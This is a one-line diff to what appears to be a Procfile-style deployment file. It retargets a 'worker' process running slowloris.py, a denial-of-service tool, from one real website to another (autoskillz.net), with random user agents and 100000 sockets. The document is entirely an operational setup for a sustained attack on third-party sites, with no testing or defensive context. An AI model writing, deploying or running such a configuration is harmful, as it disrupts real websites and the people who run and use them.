@@ -1,1 +1,1 @@
-worker: python3 slowloris.py moddersheaven.boards.net -ua -s 100000
+worker: python3 slowloris.py autoskillz.net -ua -s 100000
